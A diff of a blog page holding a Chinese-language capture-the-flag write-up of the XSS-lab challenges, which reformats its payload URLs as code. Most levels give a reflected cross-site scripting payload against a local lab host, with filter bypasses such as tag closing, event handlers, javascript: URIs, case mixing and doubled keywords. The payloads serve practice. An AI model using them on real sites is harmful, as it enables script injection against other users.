@@ -124,7 +124,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718150214528.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200718145457471.png">
 <meta property="article:published_time" content="2021-11-22T05:00:00.000Z">
-<meta property="article:modified_time" content="2021-12-10T17:14:41.000Z">
+<meta property="article:modified_time" content="2021-12-10T17:44:28.000Z">
 <meta property="article:author" content="slient2009">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -285,7 +285,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">編集日</span>
-                <time title="修正日：2021-12-10 12:14:41" itemprop="dateModified" datetime="2021-12-10T12:14:41-05:00">2021-12-10</time>
+                <time title="修正日：2021-12-10 12:44:28" itemprop="dateModified" datetime="2021-12-10T12:44:28-05:00">2021-12-10</time>
               </span>
 
           
@@ -450,30 +450,30 @@
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png" alt="image-20201128111226621"></p>
 <p>显然，这里需要闭合<code>&lt;h2&gt;</code>标签，然后跟上js代码。</p>
 <p>因为是第一关，没有特别的过滤，直接闭合就好了。</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level1.php?name=testalert(%27xxs%27);">http://192.168.68.219/xss/level1.php?name=test</h2><script>alert('xxs');</script></a></p>
+<p><code>http://192.168.68.219/xss/level1.php?name=test&lt;/h2&gt;&lt;script&gt;alert(&#39;xxs&#39;);&lt;/script&gt;</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png" alt="image-20201128111106471"></p>
 <h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>html实体编码</p>
-<p>这里要往表单input标签里面注入<br><a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level2.php?keyword=aa%22%3Ealert(1);">http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</a></p>
+<p>这里要往表单input标签里面注入<br><code>http://192.168.68.219/xss/level2.php?keyword=aa%22%3E%3Cscript%3Ealert(1);%3C/script%3E</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715144909149.png" alt="image-20200715144909149"></p>
 <h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><code>&lt;&gt;</code>被实体编码拦截，但是加<code>&#39;</code>或者<code>&quot;</code>会使得浏览器自动补全。</p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128120223330.png" alt="image-20201128120223330"></p>
-<p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus%5D">http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level3.php?keyword=11&#39;">http://192.168.68.219/xss/level3.php?keyword=11&#39;</a> onfocus=alert(1) autofocus)</p>
+<p>这里关注input标签，使用onfocus=alert(1) autofocus移动光标到元素上(或者点击)就可以触发弹窗。<br><code>http://192.168.68.219/xss/level3.php?keyword=11%27%20onfocus=alert(1)%20autofocus</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715151535637.png" alt="image-20200715151535637"></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111939700.png" alt="image-20201128111939700"></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;">http://192.168.68.219/xss/level4.php?keyword=123&#39;&quot;</a> onfocus=”javascript:alert(1))</p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这里会在<code>=</code>后面添加<code>&quot;</code>于是onfocus=alert(1)不大行了（其实还是可以触发弹窗，不过不能触发window.alert()<br>既然会自动添加<code>&quot;</code>，那么刚好用”javascript:xxxx”的方式来绕过。（好吧这个也不能触发跳转<br><code>http://192.168.68.219/xss/level4.php?keyword=123%27%22%20onfocus=%22javascript:alert%281%29</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715152933866.png" alt="image-20200715152933866"></p>
 <h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>过滤了script-&gt;s_cript    onload-&gt;o_nload<br>不知道为什么javascript:alert(1)没反应，明明解析出来都没问题。</p>
-<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Ca%20value=%2711111%27%20href=%22javascript:alert(1)</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160658462.png" alt="image-20200715160658462"></p>
-<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert(1)%5D">http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level5.php?keyword=11111&quot;">http://192.168.68.219/xss/level5.php?keyword=11111&quot;</a> &gt;</p>
+<p><code>http://192.168.68.219/xss/level5.php?keyword=11111%22%20%3E%3Cimg%20src=level5.png%20style=%22javascript:alert%281%29</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715160638311.png" alt="image-20200715160638311"></p>
 <h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>href-&gt;hr_ef<br>src-&gt;sr_c</p>
 <p>懂了，原来考的是大小写绕过，那么前面几个题也可以按照这种方法来过。</p>
-<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E%5D">http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level6.php?keyword=111&quot;">http://192.168.68.219/xss/level6.php?keyword=111&quot;</a> &gt;alert(1))</p>
+<p><code>http://192.168.68.219/xss/level6.php?keyword=111%22%20%3E%3CscRipt%3Ealert(1)%3C/scrIpt%3E</code></p>
 <h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>存在关键词过滤，这里可以使用双写关键字绕过过滤，并不能使用大小写绕过。</p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113421841.png" alt="image-20201128113421841"></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128113531000.png" alt="image-20201128113531000"></p>
-<p>[<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E%5D">http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E]</a>(<a target="_blank" rel="noopener" href="http://192.168.68.219/xss/level7.php?keyword=&quot;">http://192.168.68.219/xss/level7.php?keyword=&quot;</a> &gt;alert(1))</p>
+<p><code>http://192.168.68.219/xss/level7.php?keyword=%22%20%3E%3Cscscriptript%3Ealert(1)%3C/scriscriptpt%3E</code></p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128112539027.png" alt="image-20201128112539027"></p>
 <h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>非常神奇地在这儿卡了半天，因为一些编码的问题。</p>
 <p>审计PHP的源代码，发现过滤了script等关键字，当然可以通过实体编码绕过，比如hex或者unicode，但是要命的是hex有可能在浏览器中被自动解码再发送，而unicode是以&amp;#开头。在url中，&amp;用来分割参数，#之后的部分不向后端发送，只在本地被使用(比如锚点定位)。</p>
@@ -503,9 +503,9 @@
 <h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>仍然是类似的，注入的是cookie</p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200715210549269.png" alt="image-20200715210549269"></p>
 <h3 id="level14–"><a href="#level14–" class="headerlink" title="level14–"></a>level14–</h3><p>不会，看了WP也不会的那种。</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</a></p>
+<p><code>https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12</code></p>
 <h3 id="level15–"><a href="#level15–" class="headerlink" title="level15–"></a>level15–</h3><p>angular倒是很有意思，但是不会。</p>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/angularjs/angularjs-intro.html">https://www.runoob.com/angularjs/angularjs-intro.html</a></p>
+<p><code>https://www.runoob.com/angularjs/angularjs-intro.html</code></p>
 <p>加载angular.js要科学上网，上网回来请求多了这一坨回来不知道怎么回事儿。</p>
 <p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200716114658159.png" alt="image-20200716114658159"></p>
 <p>然后console里面就这样了，看上去level1.php是请求了，但是没有被加载到页面里。</p>
@@ -525,7 +525,7 @@
 <h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>同样的套路。</p>
 <p><code>?arg01=a&amp;arg02=b%20jsFunction%20onmouseover=javascript:alert(1)</code></p>
 <h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3><p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/6253464226/">https://www.freesion.com/article/6253464226/</a></p>
-<p>抄袭payload<code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p>
+<p>抄袭payload: <code>arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(/xss/)%22%20onerror=%22javascript:alert(1)%22%3Exss%3C/a%3E</code></p>
 <h3 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h3><p>竟然还需要逆向swf，那就只好抄了。</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/103217680">https://blog.csdn.net/u014029795/article/details/103217680</a></p>
 <h2 id="Upload-Lab"><a href="#Upload-Lab" class="headerlink" title="Upload-Lab"></a>Upload-Lab</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>图片马的检测与绕过</p>
